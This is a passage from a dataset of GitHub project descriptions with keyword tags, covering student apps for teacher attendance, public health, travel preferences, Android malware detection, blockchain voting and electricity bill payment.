Most of the colleges in India do traditional manual paperwork to maintain the records of teacher‚Äôs attendance & schedule which become burdensome. Though it works efficiently most of the time but compromises time and space. The proposed system which is based on an Android platform facilitates principal, HOD and the personnel's faculty staff throughout with the facility, regardless of the existence of network connection in the area using a typical smartphone. The proposed application and its backend system maintains access to teachers location based on Real-Time Location System (RTLS), called geofencing as well as maintaining & manipulating their timetable, checking out today‚Äôs schedule of a teacher. Additional features include editing the timetable for minor changes or import excel sheet for major changes. Also, we integrate a Quick Response (QR code) for checking the availability of the classroom using a smartphone which will help to maintain a google spreadsheet of classrooms. Overall this project of ours is being developed to help the teachers as well as Head of Department to maintain their daily schedule in the best way possible. For better understanding, we have uploaded our black book references and presentation for visual understanding.","[""android"",""location"",""time"",""backend"",""connection"",""import"",""project"",""geofencing"",""this"",""response"",""smartphone"",""task"",""real-time"",""excel"",""include"",""system"",""platform"",""google"",""android-platform"",""india"",""application"",""university"",""network"",""campus"",""schedule"",""timetable"",""management"",""book"",""daily"",""spreadsheet"",""attendance"",""for"",""location-based"",""it"",""works"",""best"",""with"",""in"",""sheet"",""staff"",""features"",""classroom"",""editing"",""quick"",""devices"",""network-connection"",""the"",""help"",""faculty"",""as"",""access"",""visual"",""based"",""manual"",""records"",""to"",""presentation"",""tablets"",""on"",""its"",""using"",""google-spreadsheet"",""a"",""colleges"",""intranet"",""checking"",""teachers"",""task-management"",""and"",""an"",""will"",""do"",""area"",""references""]"

"sha3rawi33/Sehhetna","Am writing about ""OUR"" achievement of winning the 2nd place in ""E-sus Mobile Applications Competition"" in which, competitors creates Mobile applications and research ideas for solving the ""SDGs"" sustainable development goals of the UN. Our team's submitted application was named after me ""Healthy Wealthy""; we worked on the Public Health.  The application uses location services to find the nearest (Hospital, Pharmacy, and even Doctor In the selected specification). Also, it creates a medical profile for each user where you can add all your history, and automatically, the application creates a special QR code for you ""Patient"" that you can scan it to get all data about you. another service in our application was ""Blood bank"" in which you donate/request blood from people near you, offering payment or no. which will make it easier to request and donate blood ! another important service was the ""Ambulance"" in which you click the emergency button and the application calls and sends your Coordinates to the ambulance for Urgent actions. (the government shall support an API for that). one thing else, is that we've created a service for the governmental alerts with notifications for the users. For instance: (all 6 years old children shall be vaccinated against virus C in all the public hospitals, from 17/4 till 24/4). another, is that we've added a service that is specialized in predicting the possible diseases to harm you if your parents had, like those which can be transmitted genetically. another service, is we've created ""ask a doctor"" tab, where you can ask a doctor for Urgent help, supporting image uploading, then the doctor looks at your profile and your restrictions then starts to give you advice. the application will support booking appointments with doctors and hospital, providing the nearest navigation to those hospitals/Doctors. $$ This application was built with #Flutter using #Dart #lang and created a mobile application for #Android and #iOS $$ all the Databases were built by using #FireBase and we used #Google #GMaps #API Am also honored to be the coder for this application, by helping from my researcher friend Abd El-naser and designer friend Mohamed Hesham ‚ù§Ô∏è Thank you guys ‚ù§Ô∏è","[""notifications"",""api"",""image"",""button"",""get"",""mobile"",""service"",""request"",""location"",""coordinates"",""c"",""qr-code"",""navigation"",""this"",""profile"",""mobile-application"",""location-services"",""click"",""payment"",""add"",""application"",""ideas"",""scan"",""medical"",""data"",""diseases"",""development"",""find"",""place"",""databases"",""about"",""alerts"",""for"",""booking"",""can"",""it"",""qr"",""thing"",""with"",""in"",""research"",""like"",""calls"",""user"",""public"",""support"",""services"",""virus"",""blood"",""code"",""give"",""from"",""the"",""important"",""make"",""selected"",""donate"",""to"",""one"",""applications"",""doctor"",""on"",""using"",""parents"",""a"",""emergency"",""me"",""designer"",""ambulance"",""and"",""friend"",""sustainable-development-goals"",""an"",""children"",""am"",""will"",""restrictions"",""coder"",""then""]"

In this app we indicate the preference of mode of travel of the users using CardView with name, surname and icon of the mode.

"mahitaberrefae/Malware-Detection","With the growth of mobile devices and applications, the number of malicious software, or malware, is rapidly increasing in recent years, which calls for the development of advanced and effective malware detection approaches. We propose an android malware detection system using a deep learning technique called graph convolutional neural networks. The network works on android applications. We extract some information about the application and add it to the windows event log of the server containing the network. This is the main server which is a part of a local area network that contains a number of computers that send their windows event logs to Elastic Stack. We then use the Stack to visualize this data on a browser to do some further analysis.","[""android"",""mobile"",""server"",""graph"",""browser"",""windows"",""local"",""this"",""deep-learning"",""detection"",""mobile-devices"",""system"",""add"",""stack"",""extract"",""contains"",""send"",""learning"",""to-do"",""elastic"",""application"",""network"",""android-malware"",""information"",""log"",""logs"",""data"",""effective"",""malware"",""malware-detection"",""development"",""event"",""number"",""about"",""for"",""it"",""works"",""with"",""in"",""calls"",""devices"",""android-malware-detection"",""advanced"",""the"",""to"",""main"",""on"",""using"",""a"",""and"",""an"",""some"",""deep"",""computers"",""do"",""area"",""then""]"

"LarryBrinzo/eElection","Since the adoption of the Indian Constitution in 1950, 17 general elections and many elections of various State Legislative Assemblies have been held. Although these elections were generally free and fair, yet some weaknesses of our election system have been noticed. In India, elections are very expensive and a common man, however, intelligent and honest he may be, cannot fight elections. In India, a large number of votes are cast on the basis of caste and religion. As a result, people get divided on the basis of caste, religion and community which is very harmful to national unity. Some candidates also capture the polling booths and make use of their muscle powers to do it. In India, many voters do not cast their votes. The voting percentage generally is almost 50 to 60 percent. In India, it takes a long time in the disposal of election petitions and sometimes the very purpose of election petition gets defeated.  Taking into account these flaws in the Indian election system, our team came up with an idea of building an Android Application platform to minimise these flaws using Blockchain and Android Software Development Kit. We are building this application with an aim that one-day Indian elections would solely be conducted on this application. There would no polling booths, no election rallies and no election campaigning on roads. We hope that our idea will shape a discrimination-free, an inexpensive, steady and secure elections.  The salient features of this application would be:  Parties can easily and securely broadcast their election posters and videos into the application. Parties can also conduct live public meetings with the complete involvement of the electors through a chat system. Parties can have access to all questions asked by the voters any time and can post the solution publicly. Parties will have to broadcast their manifesto into the application and will also have to submit one to Election Commission of India.  There will be real-time monitoring over shared content to bring about a check over the caste-based campaigning.  The electors will be authenticated through their Voter ID or Aadhar card. The voters can also authenticate using their unique fingerprint.  There would be an easy and secure way of casting a vote through the application using Blockchain. The voter‚Äôs information will be stored in a Block so that they are not easily tampered by the attackers.  Using Blockchain, we promise a steady and secure election system. The election results could be calculated steadily and securely.  In a place where there is no internet, the application can build a local blockchain, storing data in the phone memory and can be later merged to the global blockchain. (Again at such places election will be conducted under supervised authority)  Once the elections are over, citizens can have a timely update of what the ruling party is up to, and what are the reforms made by them till now. Citizens can easily direct a suggestion or complaint to the ruling party.","[""android"",""memory"",""get"",""post"",""time"",""broadcast"",""build"",""shared"",""block"",""local"",""this"",""casting"",""monitoring"",""chat"",""real-time"",""state"",""global"",""promise"",""system"",""platform"",""account"",""submit"",""capture"",""percentage"",""android-application"",""to-do"",""update"",""blockchain"",""application"",""common"",""phone"",""videos"",""information"",""free"",""cast"",""shape"",""data"",""community"",""content"",""secure"",""live"",""check"",""development"",""number"",""place"",""elections"",""timely"",""so"",""results"",""easy"",""about"",""can"",""it"",""polling"",""voting"",""idea"",""with"",""in"",""software"",""places"",""party"",""features"",""team"",""public"",""authenticate"",""complete"",""aadhar"",""building"",""fight"",""the"",""as"",""election"",""vote"",""long"",""access"",""software-development"",""make"",""indian"",""questions"",""to"",""one"",""direct"",""no"",""on"",""using"",""a"",""not"",""solution"",""large"",""cannot"",""religion"",""and"",""made"",""an"",""some"",""intelligent"",""meetings"",""adoption"",""aim"",""will"",""do"",""once"",""suggestion"",""id"",""any"",""easily"",""over""]"

The system automates the conventional process of paying electricity bill by visiting the place. Users have to stand in queue for paying bill and wait for their turn. The process is tiresome and time consuming. They even have to wait for the bill being delivered to their place which sometimes can be delivered late by the delivery boy. Hence the system is developed to automate the electricity bill calculation and payment for user convenience. The system would be having two logins admin and user login. Admin can view user account details and can even add or updates things in their account. Admin has to feed the system with electricity usage data into respective users account through online web application. The system then calculates the electricity bill for every user and updates the information into their account every month. User can then view their electricity bill and pay on the spot before month end. If user is incapable of paying the bill before month end, it then calculates fine for each day.","[""android"",""get"",""view"",""web"",""time"",""process"",""project"",""updates"",""queue"",""payment"",""wait"",""system"",""add"",""account"",""feed"",""application"",""delivery"",""information"",""data"",""details"",""month"",""place"",""calculation"",""for"",""can"",""it"",""with"",""in"",""online"",""user"",""admin"",""credit"",""the"",""based"",""usage"",""to"",""instant"",""pay"",""spot"",""on"",""bill"",""users"",""and"",""an"",""things"",""two"",""then"",""electricity""]"
